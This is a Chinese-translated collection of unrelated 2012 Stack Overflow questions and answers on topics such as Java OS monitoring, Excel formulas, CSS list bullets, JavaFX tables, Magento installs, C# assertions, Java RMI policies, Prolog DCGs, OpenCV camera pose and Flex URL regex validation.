# java - 使用 Java 监控操作系统

> ID：13957104
> 
> 赞同：0
> 
> 时间：2012-12-19T16:46:55.520
> 
> 标签：java, c

我计划实施一个框架来监控操作系统级别的资源：

*   过程
*   网络统计
*   cpu信息等

使用 Java。

我看到 Spring 有 SIGAR API，它是用本地语言实现的，并且在上面提供了 Java API。

但我不希望在我的框架中包含本机内容，而是为每个操作系统编写一个 Java 类，该类将通过 Java 运行时运行系统命令来获取所需的操作系统信息。

所以我想有一些输入/建议，人们可能已经看到在 Java 中不这样做并使用本机 app/api/jni。任何例子肯定会有所帮助。我同意每个操作系统都有不同的命令来获取这些统计信息，但更喜欢每个操作系统都有一个 Java 类而不是拥有/加载本机代码。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T16:51:25.223

我使用 SIGAR API 取得了巨大成功。我建议使用它，听起来这正是您所需要的。

# excel - 使用两个不同的列与另一个工作表进行比较

> ID：13957112
> 
> 赞同：1
> 
> 时间：2012-12-19T16:47:12.473
> 
> 标签：excel, if-statement, match, multiple-columns, vlookup

我有两列彼此不同。一个包含数字，另一个包含文本。试图将两者与另一个单独的工作表进行比较（匹配）。

当然，我可以分别对每一个进行 VLookup，但这并不能给出我正在寻找的答案。我想知道前两列是否与另一个工作表相关。

我也尝试了 IF(VLookup 但可能做错了。

把它们加起来。如果 A 列和 B 列都在另一个工作表上，则为 True 或 False。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T17:31:13.193

这是一个工作表函数，假设您只在工作表 2 的 1 列中查看，它将执行您想要的操作。只需将 [] 中的值替换为实际范围：

```
=NOT(OR(ISNA(MATCH([ColumnA],[OtherWorksheet],FALSE)), ISNA(MATCH([ColumnB],[OtherWorksheet],FALSE)))) 
```

这是一个使用实际范围的示例：

```
=NOT(OR(ISNA(MATCH(A1,Sheet2!A:A,FALSE)), ISNA(MATCH(B1,Sheet2!A:A,FALSE)))) 
```

仅供参考：如果您不想在单元格中显示它，也可以使用此公式进行条件格式设置。

只是为了解释一下：
`MATCH`如果找到该值，将返回一个数字，否则将是#N/A。
`ISNA`将指示结果是否为#N/A。如果任一嵌套指示为 TRUE
`OR`，则将导致TRUE。`ISNA`（表示未找到 1 个值）
`NOT`将 TRUE 翻转为 FALSE，反之亦然。
最终结果，如果找到两个值，则返回 TRUE，否则显示 FALSE。

# forms - 如何使用 4 个下拉选择来显示结果文本？

> ID：13957113
> 
> 赞同：1
> 
> 时间：2012-12-19T16:47:13.723
> 
> 标签：forms

如果我需要使用 4 个不同的下拉框和每个下拉框选择的值，当它们组合时，我可以将文本框输出等同起来——我会怎么做？

我从投递箱 1 中选择，然后从投递箱 2 中选择，然后从投递箱 3 中选择，然后从投递箱 4 中进行选择，并且组合选择（如果`drpbx1selected value = 1`、和`drpbx2selected value=3`、和...）允许我为其分配文本输出？

我将每个下拉列表设置为一个带有函数 Option1、2、3、4 和一个变量 sel1、2、3 和 4 的表单，以指示选择的 4 个可能值：

```
function setOption1(chosen) {
    if (chosen == "1") {
        var e1 = document.getElementById("e27");
        var sel1 = e1.options[e1.selectedIndex].value;
    }
    else if (chosen == "2") {
        var e2 = document.getElementById("e27");
        var sel2 = e2.options[e2.selectedIndex].value;
    }
} 
```

然后我使用函数的 selx 变量来显示由 4 个选定值产生的零件编号。这就是我卡住的地方——我不知道用什么来显示从四个值派生的零件号。有 15 个可能的零件编号和 15 个可能的值选择。

```
function displaysel()
if (sel1 == "1" , sel3 == "3", sel7 == "7", sel9 == "9") {
    var partno = "600-618";
} 
```

我是新手，真的需要解决这个问题。任何帮助表示赞赏！

# css - 子弹不会在 Firefox 中消失

> ID：13957115
> 
> 赞同：1
> 
> 时间：2012-12-19T16:47:20.003
> 
> 标签：css, firefox, styles, html-lists

希望你能帮我解决一个问题。我无法摆脱 Firefox 中的 Bullets，我不想要任何地方，因此我的 list-style-type: none!important 无处不在。据我所知，它只出现在 Firefox 中。

HTML....

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> 
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
    <title>littleprints.nl</title>
    <meta name="description" content="----" />
    <meta name="keywords" content="----" />
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
    <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4/jquery.min.js"></script>
    <script type="text/javascript" src="js/slimbox2.js"></script>
    <link rel="stylesheet" href="css/slimbox2.css" type="text/css" media="screen" />
    <link rel="stylesheet" href="layout.css"/>
    <link rel="stylesheet" href="style.css"/>
 </head>
 <body>
    <div id="container">
      <div id="inline1">
         <div id="mainpic">
            <img src="myimages/circle.jpg" width="100%" alt="Circle bracelet"/>
         </div>
         <div id="intro">
            <p>Hi and welcome to little prints NL. we make this and that all by hand with 100% silver. my name is Donna Burns and i work by commision, ive been studying for 4 years and am currently learning to become a goldsmith.</p>
         </div>
      </div>

      <div id="inline2">
         <p>Click for more...</p>
         <div id="images">
            <a href="myimages/photos/dogtag.jpg" rel="lightbox-gal" title="Beautiful, isn't it?" ><img src="myimages/work/chunky.gif" alt="chunky"/></a>
            <a href="myimages/photos/hearts.jpg" rel="lightbox-gal" title="Beautiful, isn't it?" ><img src="myimages/work/hearts.gif" alt="hearts"/></a>        
            <a href="myimages/photos/close.jpg" rel="lightbox-gal" title="Beautiful, isn't it?" ><img src="myimages/work/close.gif" alt="close"/></a>       
            <a href="myimages/photos/pearl.jpg" rel="lightbox-gal" title="Beautiful, isn't it?" >&nbsp;</a>
            <a href="myimages/photos/flower.jpg" rel="lightbox-gal" title="Beautiful, isn't it?" >&nbsp;</a>
            <a href="myimages/photos/frontcircle.jpg" rel="lightbox-gal" title="Beautiful, isn't it?" >&nbsp;</a>       
            <a href="myimages/photos/dogtag.jpg" rel="lightbox-gal" title="Beautiful, isn't it?" >&nbsp;</a> 

        </div>
     </div>

</div><!--end container-->

<div id="footer">
    <div id="footalign">

       <div id="social">

         <ul>
            <li>
              <a href="http://www.facebook.com/littleprints" title="Little Prints">
                 <img src="myimages/facebook.png" width="50px" height="50px" alt="FB"/>
              </a>
           </li>
           <li>
             <a href="contact.html" title="contact">
                <img src="myimages/at.gif" alt="@"/>
             </a>
           </li>
        </ul>

      </div>

      <div id="contact">
         <p><br/>To enquire about a charm either phone:<br/> 0787463289<br/> or use one of the methods to the side.</p>
      </div>

    </div>
 </div>

 </body>
</html> 
```

的CSS...

```
* {margin: 0; padding: 0; border: 0;}

html, body {
    background-color: #000000;image;
    text-align: center;
    font: 16px/1.8 Verdana, Arial, Helvetica, sans-serif;
    list-style-type: none!important;
    text-decoration: none;
}

#container {
    position: relative;
    width: 900px;
    top: 0;
    min-height: 100%;
    margin-left: auto;
    margin-right: auto;
    padding-top: 20px;
    background-image: URL(myimages/back2.gif);
    margin-bottom: 180px;
}

#footer {
    background-color: #555555;
    position: relative;
    clear: both;
    bottom: 0;
    width: 900px;
    height: auto;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 20px;
    padding-bottom: 22px;
    margin-top: -180px;
}

#inline1{
    display: inline-block;
    margin-top: 250px;
    margin-bottom: 20px;
}

#inline2 {
    display: inline-block;
    margin-top: 30px;
    margin-bottom: 50px;
}

#mainpic {
    float: left;
    width: 68%;
    margin-left: 20px;
}

#intro {
    float: right;
    width: 20%;
    margin-left: auto;
    margin-right: 50px;
    margin-top: 20px;
}

#images {
    margin-bottom: 20px;
    margin-left: auto;
    margin-right: auto;
}

#footalign {
    display: inline;
    width:900px;
    list-style-type: none;
}

#contact {
    text-align: center;
    background-color:#555555;
    float: middle;
    list-style-type: none;
}

#social{
    background-color:#555555;
    float: right;
    list-style: none;
    padding:0;
    padding-right: 5px;
    text-align:center;
    list-style-type: none!important;
}

#social  img{
    border: none;
    list-style-type: none!important;
    margin: 3px;
}

#social ul{
    border: none;
    list-style-type: none!important;
}

#social a{
    display:inline-block;
    -webkit-transition:all .5s ease-out;
    -moz-transition:all .5s ease-out;
    -ms-transition:all .5s ease-out;
    -o-transition:all .5s ease-out;
    transition:all .5s ease-out;
    list-style-type: none!important;
}

#social a:hover{
    display:inline-block;
    -webkit-transform:translate(-10px,0px);
    -moz-transform:translate(0px,-10px);
    -ms-transform:translate(-10px,0px);
    -o-transform:translate(-10px,0px);
    transform:translate(-10px,0px);
    list-style-type: none!important;
}

#form {
    margin-top: 250px;
    margin-bottom: 50px;
}

.nav1
    {font-family: sans-serif;font-size: 22px;text-shadow: 2px 2px 5px #000000;}
    a:link {text-decoration:none; color:#000000; padding:3px;}
    a:visited {text-decoration:none; color:#000000;}
    a:active {text-decoration:none; color:#555555;}
    a:hover {text-decoration:none; color:#555555;}

.nav2
    {font-family: sans-serif;font-size: 22px;text-shadow: 2px 2px 5px #ffffff;}
    a:link {text-decoration:none; color:#ffffff; padding:3px;}
    a:visited {text-decoration:none; color:#ffffff;}
    a:active {text-decoration:none; color:#555555;}
    a:hover {text-decoration:none; color:#555555;}

.p1 {
    color: #ffffff;
}

div#images img {
    max-width: 500px;
    height: auto;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T16:54:54.353

尝试：

```
#social ul {
border: none;
list-style: none!important;
} 
```

只是使用`list-style`可能会简化它。但无论如何，我在 Firefox 中，我没有看到任何要点。

您可能想尝试在 jsFiddle 中为我们设置一个测试用例。像这样发布代码有时是大海捞针！

[http://jsfiddle.net/](http://jsfiddle.net/)

祝你好运。

PS - 放置`list-style`下面的代码没有任何意义，因为您正在指定一个`img`标签！

```
#social img {
border: none;
list-style-type: none!important;
margin: 3px;
} 
```

**更新：**

为了争论（因为我无法确切地看到您的应用程序是如何工作的），请尝试为您的列表设置全局默认样式，如下所示：

```
ul, ol { list-style: none; } 
```

另外，我知道在一些较旧的浏览器中，在实际的 li 本身上设置它也有帮助（虽然我可能是错的）：

```
li { list-style: none; } 
```

# tableview - JavaFX TableView 内容在滚动时消失

> ID：13957118
> 
> 赞同：3
> 
> 时间：2012-12-19T16:47:30.940
> 
> 标签：tableview, javafx-2

我设法创建了一个`TableView`分配给数据模型类的特定列。该程序可以将 csv 文件解析到其中并在表格中正确显示所有内容。在这个阶段滚动不是问题。

然后我想选择特定的行并将它们发送到另一个表。这也有效。但是当我再次开始在 table1 中滚动时，可视区域之外的内容消失了。

我真的不明白这里发生了什么，因为我没有为 table1 更改任何内容。两个列表都使用 Order 作为数据模型......也许这是一个问题？这是将行发送到 table2 的代码：

```
if(init) { //init is true
    ObservableList<TableColumn<Order, ?>> header = table1.getColumns();
    table2.getColumns().addAll(header);
    table2.setItems(table2Observable);
    init = false;
}

table2Observable.addAll(table1.getSelectionModel().getSelectedItems());
table2.setItems(table2Observable); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-03-05T13:38:04.173

如果 order 是您的 bean 类，则正确覆盖 hashcode() 和 equals() 方法。这是由于重复的对象而发生的。它对我有用。

# php - Magento 1.7.0.2 安装重定向循环 index.php/install

> ID：13957131
> 
> 赞同：3
> 
> 时间：2012-12-19T16:48:15.570
> 
> 标签：php, apache, magento, redirect, installation

我已经下载了 magento 1.7.0.2 并上传到我的 WAMP 服务器上。我确保在 Apache 上启用了 rewrite_module。但是当我尝试运行安装时，在我输入数据库信息和内容的配置页面之后，服务器会抛出一个无限重定向循环。

我不确定是不是因为我在 Apache 上使用的重写引擎或虚拟主机。

帮助表示赞赏！谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-09T12:24:14.427

它也发生在我身上。我尝试使用 nginx 安装 1.7.0.2 和来自 magento 的示例数据。

根据[http://www.magentocommerce.com/boards/viewthread/5182/# ，问题似乎是样本数据（或洋红色数据库中的任何其他数据）](http://www.magentocommerce.com/boards/viewthread/5182/#)

清除数据库并再次提取源代码为我解决了这个问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-18T07:47:35.900

应指定对数据库具有特权的用户有权访问本地主机，而不是所有主机。对我来说它有效，我跳过了重定向循环。

# php - Foreach PHP 语句不使用 PHP 和 MySQL 存储多条推文

> ID：13957132
> 
> 赞同：0
> 
> 时间：2012-12-19T16:48:18.217
> 
> 标签：php, mysql, twitter

这可能只是一个愚蠢的错误，但我已经构建了一个工具来监控某个哈希标签的推文。但是，当我尝试将它们保存到数据库时，它只会保存一条推文。

我在下面附上了我的代码。

```
foreach($results as $result) {

$tweetID = $result->id_str;
$userID = $result->from_user_id_str;
$tweetText = $result->text;
$tweet_time = strtotime($result->created_at);
$createdAt = date('Y-m-d H:i:s ',$tweet_time);

echo '<div>'.
     '<div class="tweet" >' . displayTweet($result->text),"\r\n" .
        '<div class="user">'. '<strong>Posted </strong>' . date('j/n/y H:i:s ',$tweet_time). '<strong> By </strong>' . 
        '<a rel="nofollow" href="http://twitter.com/' . $result->from_user. '">' . $result->from_user .
        '</div>' .
  '</div>'; 

// Execute query
mysql_select_db("dbname", $conn) or die(mysql_error()); 
$query = ("INSERT INTO ".$hashtag."(tweetID, userID, tweetText, createdAt) VALUES('$tweetID', '$userID', '$tweetText', '$createdAt')");
$output = mysql_query($query) or trigger_error(mysql_error()." in ".$query);
}
mysql_close($conn);
?> 
```

我将如何解决此问题以保存每条推文？提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T18:12:21.857

结果证明代码没有任何问题。这与解析推文 id 的方式有关，并且表格对它有独特的限制

# c# - 使用 Assert 作为前置条件可以吗？

> ID：13957137
> 
> 赞同：5
> 
> 时间：2012-12-19T16:48:44.213
> 
> 标签：c#, .net, null, assert, illegalargumentexception

我正在阅读与处理空值有关的这篇[文章。](https://stackoverflow.com/a/271874/649524)

建议之一（根据 SO 帖子）是在 null 无效时使用 Assert。

我（到目前为止）在测试项目中广泛使用了空值。在普通代码（测试项目除外）中使用 Asserts 语句对我来说看起来很奇怪。

**为什么**-> 因为我从来没有这样用过，也从来没有读过任何关于它的书。

**问题**
1\. 是否可以使用 Asserts 作为前提条件
2\. Asserts 在检查参数和抛出 Argument___Exception 方面的优缺点

如果重要的话，我要.NET（不是java）

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-19T16:52:53.447

您可能想查看[Code Contracts](http://msdn.microsoft.com/en-us/devlabs/dd491992.aspx)。它们为您的方法提供静态和运行时检查，您也可以将它们应用到您的接口，以便合约成为您的公共 API 的一部分。

例如，从我自己的一些代码中复制而来（此代码在接口上实现合约）：

```
using System;
using System.Diagnostics.Contracts;

using Project.Contracts.Model.Accounts;
using Project.Contracts.Services;

/// <summary>
/// Data access for accounts.
/// </summary>
[ContractClass(typeof(AccountRepositoryContract))]
public interface IAccountRepository
{
    /// <summary>
    /// Gets the user by id.
    /// </summary>
    /// <param name="userId">The user id.</param>
    /// <returns>The user, or <c>null</c> if user not found.</returns>
    [Pure]
    User GetUserById(int userId);
}

/// <summary>
/// Contract class for <see cref="IAccountRepository"/>.
/// </summary>
[ContractClassFor(typeof(IAccountRepository))]
internal abstract class AccountRepositoryContract : IAccountRepository
{
    /// <summary>
    /// Gets the user by id.
    /// </summary>
    /// <param name="userId">The user id.</param>
    /// <returns>
    /// The user, or <c>null</c> if user not found.
    /// </returns>
    public User GetUserById(int userId)
    {
        Contract.Requires<ArgumentException>(userId > 0);

        return null;
    }
} 
```

一个更简单但更全面的示例：

```
public class Foo
{
    public String GetStuff(IThing thing)
    {
        // Throws ArgumentNullException if thing == null
        Contract.Requires<ArgumentNullException>(thing != null);

        // Static checking that this method never returns null
        Contract.Ensures(Contract.Result<String>() != null);

        return thing.ToString();
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-19T16:51:29.950

这篇文章*只是*关于**`Microsoft.VisualStudio.TestTools.UnitTesting.Assert`**，不是`Debug.Assert`。

我不建议这样做，因为[`Assert`该类](http://msdn.microsoft.com/en-us/library/microsoft.visualstudio.testtools.unittesting.assert%28v=vs.110%29.aspx)位于`Microsoft.VisualStudio.TestTools.UnitTesting`名称空间中，它正在测试东西而不是生产工具。它们也在一个单独的程序集中，您不需要从非测试代码中引用。

`ArgumentException`(illegal argument, with `ArgumentNullException`and `ArgumentOutOfRangeException`for further split) 和 and `InvalidOperationException`(illegal state) 用于条件检查。

作为替代方案，也有代码合同。见[史蒂夫的回答](https://stackoverflow.com/a/13957225/17713)。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-19T16:55:31.350

它们实际上是两个不同的断言。您在单元测试中使用的 Assert 用于触发测试失败（当然，它们总是经过测试）。您在其他代码中使用的 Asserts 是一个单独的函数 ( `System.Diagnostics.Debug.Assert()`)，在开发过程中用作帮助工具，以在不满足预期条件时提醒您。但是，这些断言*仅*在调试版本中进行测试。如果您进行发布构建，则断言将无效。所以它*不是*一个通用的错误处理工具，你不应该计划用它来捕获错误。

它只是在测试和开发过程中捕获逻辑错误，告诉您您的假设是否成立。因此，是的，它对于测试前置条件和后置条件非常有用。

请注意，这种 Assert 有点争议，因为它可能会成为您最终使用的拐杖，*而不是*正确的错误处理，并且由于它在发布版本中没有影响，您最终可能会发布不存在错误处理的软件。（例如，不要使用 Assert 来检查文件是否存在。它是真实世界中可能发生的真实错误，因此需要真实世界的错误处理。）但我个人认为它是一个非常有用的工具，用于测试前置条件和后置条件，而不必担心性能开销（由于测试在发布版本中被删除，它实际上是免费的，并且它在断言失败时触发调试器，而不仅仅是抛出异常）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-19T16:58:34.920

就个人而言，如果我要在方法中处理空值，那么我肯定**不会**`assert`在所述方法中使用 an 。相反，正如您所说，抛出异常。

本质上，当断言失败时——无论如何它基本上都是一个例外。如果你要抛出一个`ArgumentNullException`我会避免在方法本身中使用 try catch 来做任何事情，而是在你的单元测试中处理它。

```
public class A
{
  public double Add(double a, double b)
  {
    if (a == null || b == null)
      throw new ArgumentNullException("");
    return a + b;
  }
}

[TestClass()]
public UnitTest
{
  [TestMethod()]
  public void ATest()
  {
    try
    {
      double d = new A().Add(null, 1);
    }
    catch(ArgumentNullException ex)
    {
      //Fail the test
      Assert.Fail("");
      //Or throw, this will allow you to double click the exception in the unit test and go to the line of code which failed
      throw ex;
    }  
  }
} 
```

# java - 文件传输 RMI

> ID：13957140
> 
> 赞同：0
> 
> 时间：2012-12-19T16:48:51.550
> 
> 标签：java, rmi, file-transfer

我只是在学习如何使用 RMI 发送文件的教程。

教程：[链接](http://www.oracle.com/technetwork/articles/javase/rmi-corba-136641.html)

当我尝试运行我的服务器时遇到错误。我所做的与教程不同的唯一更改是我将端口更改为 1097 而不是默认的 1099。

我该如何解决这个错误？

这是我收到的错误：

```
C:\Program Files\Java\jdk1.7.0_09\bin\FT_RMI>java -Djava.security.policy=policy.
txt FileServer
FileServer: access denied ("java.net.SocketPermission" "127.0.0.1:1097" "connect
,resolve")
java.security.AccessControlException: access denied ("java.net.SocketPermission"
 "127.0.0.1:1097" "connect,resolve")
        at java.security.AccessControlContext.checkPermission(Unknown Source)
        at java.security.AccessController.checkPermission(Unknown Source)
        at java.lang.SecurityManager.checkPermission(Unknown Source)
        at java.lang.SecurityManager.checkConnect(Unknown Source)
        at java.net.Socket.connect(Unknown Source)
        at java.net.Socket.connect(Unknown Source)
        at java.net.Socket.<init>(Unknown Source)
        at java.net.Socket.<init>(Unknown Source)
        at sun.rmi.transport.proxy.RMIDirectSocketFactory.createSocket(Unknown S
ource)
        at sun.rmi.transport.proxy.RMIMasterSocketFactory.createSocket(Unknown S
ource)
        at sun.rmi.transport.tcp.TCPEndpoint.newSocket(Unknown Source)
        at sun.rmi.transport.tcp.TCPChannel.createConnection(Unknown Source)
        at sun.rmi.transport.tcp.TCPChannel.newConnection(Unknown Source)
        at sun.rmi.server.UnicastRef.newCall(Unknown Source)
        at sun.rmi.registry.RegistryImpl_Stub.rebind(Unknown Source)
        at java.rmi.Naming.rebind(Unknown Source)
        at FileServer.main(FileServer.java:11) 
```

第 11 行是 Naming.rebind()。

这里：

```
FileInterface fi = new FileImpl("FileServer");
     Naming.rebind("//127.0.0.1:1097/FileServer", fi); 
```

我尝试将地址更改为 localhost，但出现同样的错误。

**解决方案**

指向 JRE 文件夹或特定策略文件中的特定 java 策略文件。

```
java -Djava.security.policy="C:\\FT_RMI\\java.policy" FileServer 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T19:01:12.787

您必须在 JRE 下的安全属性上允许套接字连接。你可以在 jre/lib/security/java.policy 下看到这个

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-20T10:23:36.563

您正在运行您的服务器`SecurityManager.`除非您正在使用 RMI 代码库功能，或者您有其他特定的安全要求要求它在服务器中使用，否则只需将其删除。

# syntax - prolog，非常简单的 dcg 语法

> ID：13957146
> 
> 赞同：3
> 
> 时间：2012-12-19T16:49:21.623
> 
> 标签：syntax, prolog, dcg

我正在尝试了解 prolog 和 dcg 的基本语法，但是很难获得有关真正基本内容的正确信息。看看下面的代码，我基本上只是想实现这样的东西：

```
Output = te(a, st).

Code: 
    test(te(X,Y)) --> [X], test2(Y).
    test2(st(_X)) --> [bonk]. 

    ?- test(Output, [a, bonk],[]).
    Output = te(a, st(_G6369)). 
```

我想做的就是在末尾添加“st”这个词，我最接近的方法是这样做，但不幸的是 st 后面跟着一堆废话，很可能是因为 singleton `_X`。我只是希望我`Output`包含如下内容：`te(a, st).`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T16:57:59.737

如果您想接受表单的输入`[Term, bonk]`并获取`te(Term,st)`，您应该更改`test/2`为接受 bonk a return `st`：

```
test(te(X,Y)) --> [X], test2(Y).
test2(st) --> [bonk].

?-  test(Output, [a, bonk],[]).
Output = te(a, st). 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-19T16:58:09.953

正如您所说， st 后面跟着“一堆废话”，因为`_X`（基本上，_G6369 是变量的内部“名称”，并且由于变量保持未实例化，因此序言会显示它；尝试`print(X), X=3, print(X).`

无论如何，您可以简单地删除，`(_X)`因为您可以将任何您想要的东西作为参数：

```
test(te(X,Y)) --> [X], test2(Y).
test2(st) --> [bonk]. 
```

当然，如果您的输入中实际上没有`bonk`' 并且您只是想`st`在末尾添加 a ，您可以进一步简化它：

```
test(te(X,st)) --> [X]. 
```

或者，如果您有`bonk`：

```
test(te(X,st)) --> [X,bonk]. 
```

最后，一般建议使用[短语/3](http://www.swi-prolog.org/pldoc/doc_for?object=phrase/3)或[短语/2](http://www.swi-prolog.org/pldoc/doc_for?object=phrase/2)，而不是手动添加参数。

# c++ - OpenCV计算相机位置&&旋转

> ID：13957150
> 
> 赞同：5
> 
> 时间：2012-12-19T16:49:43.493
> 
> 标签：c++, opencv, camera, rotation, position

对于一个项目，我需要计算相机相对于已知物体的真实位置和方向。我有一组照片，每张照片都从不同的角度展示了一个棋盘。使用 CalibrateCamera 和 solvePnP 我能够在 2d 中重新投影点，以获得 AR 的东西。所以我的情况是这样的：

*   内在参数是已知的

*   失真系数是已知的

*   每张照片都知道平移向量和旋转向量。

我根本无法弄清楚如何计算相机的位置。我的猜测是：

*   反转平移向量。(=t')

*   将旋转向量转换为度数（似乎是弧度）并反转

*   在旋转矢量上使用罗德里格斯

*   计算 RotationMatrix * t'

但结果不知何故完全不对......基本上我想为世界坐标中的每个像素计算一条射线。如果需要有关我的问题的更多信息，我很乐意快速回答。

我不明白……不知何故，光线仍然熄灭。这是我的代码顺便说一句：

```
Mat image1CamPos = tvecs[0].clone(); //From calibrateCamera
Mat rot = rvecs[0].clone(); //From calibrateCamera
Rodrigues(rot, rot);
rot = rot.t();

//Position of Camera
Mat pos = rot * image1CamPos;

//Ray-Normal (( (double)mk[i][k].x) are known image-points)
float x = (( (double)mk[i][0].x) / fx) - (cx / fx);
float y = (( (double)mk[i][0].y) / fy) - (cy / fy);
float z = 1;
float mag = sqrt(x*x + y*y + z*z);
x /= mag;
y /= mag;
z /= mag;

Mat unit(3, 1, CV_64F);
unit.at<double>(0, 0) = x;
unit.at<double>(1, 0) = y;
unit.at<double>(2, 0) = z;

//Rotation of Ray
Mat rot = stof1 * unit; 
```

但是当绘制这个时，光线是关闭的：/

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-19T17:23:44.387

物体相对于相机的平移 t（3x1 向量）和旋转 R（3x3 矩阵）等于从物体到相机空间的坐标变换，由下式给出：

```
v' = R * v  + t 
```

旋转矩阵的求逆就是简单的转置：

```
R^-1 = R^T 
```

知道了这一点，您可以轻松地将转换（第一个 eq.）解析为 v：

```
v = R^T * v' - R^T * t 
```

这是从相机到物体空间的转换，即相机相对于物体的位置（旋转 =`R^T`和平移 = `-R^T * t`）。

您可以从中简单地得到一个 4x4 齐次变换矩阵：

```
T = ( R^T  -R^T * t )
    (  0       1    ) 
```

如果您现在在相机坐标中有任何点，则可以将其转换为对象坐标：

```
p' = T * (x, y, z, 1)^T 
```

因此，如果您想从坐标为 (a,b) 的像素投射光线（可能您需要将图像的中心，即 报告的主点定义`CalibrateCamera`为 (0,0)） - - 让那个像素成为`P = (a,b)^T`。它在相机空间中的 3D 坐标为`P_3D = (a,b,0)^T`。让我们在正 z 方向上投影一条 100 像素的射线，即到点`Q_3D = (a,b,100)^T`。您需要做的就是使用转换矩阵 T 将两个 3D 坐标转换为对象坐标系，您应该能够在对象空间中的两个点之间画一条线。但是，请确保您不要混淆单位：CalibrateCamera 将报告像素值，而您的对象坐标系可能以 cm 或 mm 为单位进行定义。

# regex - RegExpValidator 无法正确验证 URL 模式

> ID：13957151
> 
> 赞同：0
> 
> 时间：2012-12-19T16:49:44.263
> 
> 标签：regex, apache-flex

当我在下面的正则表达式中检查它时，URL [http://www.ftd.de/rss2](http://www.ftd.de/rss2)无效（不冒险）`<mx:RegExValidator>`：

```
<mx:RegExpValidator id="validatorURL" required="true" enabled="true"
    source="{inputURL}" property="text" triggerEvent="focusOut"
    expression="{resourceManager.getString('resources','general.urlRegExp')}"
    flags="i" /> 
```

**只要 URL 不以数字结尾，**这个带有以下 RegEx 的 RegExValidator 就可以正确验证 URL 。任何其他有效的 URL 似乎都是有效的。

这是为什么？弹性错误？

* * *

## 正则表达式

我使用Diego [Perini的](https://github.com/dperini)[这个 RegEx ，它在](https://gist.github.com/729294)[这个比较](http://mathiasbynens.be/demo/url-regex)中得到了最好的结果。

```
^(?:(?:https?|ftp):\/\/)(?:\S+(?::\S*)?@)?(?:(?!10(?:\.\d{1,3}){3})(?!127(?:\.\d{1,3}){3})(?!169\.254(?:\.\d{1,3}){2})(?!192\.168(?:\.\d{1,3}){2})(?!172\.(?:1[6-9]|2\d|3[0-1])(?:\.\d{1,3}){2})(?:[1-9]\d?|1\d\d|2[01]\d|22[0-3])(?:\.(?:1?\d{1,2}|2[0-4]\d|25[0-5])){2}(?:\.(?:[1-9]\d?|1\d\d|2[0-4]\d|25[0-4]))|(?:(?:[a-z\u00a1-\uffff0-9]+-?)*[a-z\u00a1-\uffff0-9]+)(?:\.(?:[a-z\u00a1-\uffff0-9]+-?)*[a-z\u00a1-\uffff0-9]+)*(?:\.(?:[a-z\u00a1-\uffff]{2,})))(?::\d{2,5})?(?:\/[^\s]*)?$ 
```

RegEx 本身与上述 URL 配合得很好，它可以在我迄今为止测试过的任何非 flex 验证器中正确验证：

*   [快速雷克斯](http://bastian-bergerhoff.com/eclipse/features/web/QuickREx/toc.html)
*   [正则表达式](http://regexpal.com/)
*   [JRegExpTester](http://jregexptester.sourceforge.net/)
*   [正则测试仪](http://sourceforge.net/projects/regextester/files/RegExTester%20Binaries/3.2.0.0/)

我用两个基于 Flex 的验证器检查了 RegEx，它们都无法验证**任何**URL：

*   [http://gskinner.com/RegExr/](http://gskinner.com/RegExr/)
*   [http://ryanswanson.com/regexp/#start](http://ryanswanson.com/regexp/#start)

* * *

我们使用 Flex SDK 4.6.0.23201。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T09:16:14.430

`\uhhhh`2 个基于 Flex 的在线测试仪似乎无法识别该序列。这可能是 Flex 正则表达式实现中的错误，也可能是测试器实现中的错误，或者可能是文档中的错误。

在使用下面的正则表达式之前，请检查原始正则表达式是否在您的程序中有效。

这是在在线测试人员上测试正则表达式的解决方法：全部替换`\uhhhh`为`\x{hhhh}`. 我不确定它在实际代码中是否仍然有效。这在任何地方都没有记录，我只是从其他用户的回答中发现了这一点。

```
^(?:(?:https?|ftp):\/\/)(?:\S+(?::\S*)?@)?(?:(?!10(?:\.\d{1,3}){3})(?!127(?:\.\d{1,3}){3})(?!169\.254(?:\.\d{1,3}){2})(?!192\.168(?:\.\d{1,3}){2})(?!172\.(?:1[6-9]|2\d|3[0-1])(?:\.\d{1,3}){2})(?:[1-9]\d?|1\d\d|2[01]\d|22[0-3])(?:\.(?:1?\d{1,2}|2[0-4]\d|25[0-5])){2}(?:\.(?:[1-9]\d?|1\d\d|2[0-4]\d|25[0-4]))|(?:(?:[a-z\x{00a1}-\x{ffff}0-9]+-?)*[a-z\x{00a1}-\x{ffff}0-9]+)(?:\.(?:[a-z\x{00a1}-\x{ffff}0-9]+-?)*[a-z\x{00a1}-\x{ffff}0-9]+)*(?:\.(?:[a-z\x{00a1}-\x{ffff}]{2,})))(?::\d{2,5})?(?:\/[^\s]*)?$ 
```

[**RegExr 上**](http://regexr.com/v1/?33u90)的演示（我使用了问题链接中的测试数据）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T15:45:09.423

nhahtdh 的回答让我再次检查了这个问题。它没有解决问题，但它为我指明了正确的方向。我将使用他回答中的 RegExp，因为从`\uhhhh`to的建议转换`\x{hhhh}`也是必要的。

## 编辑：解决方案

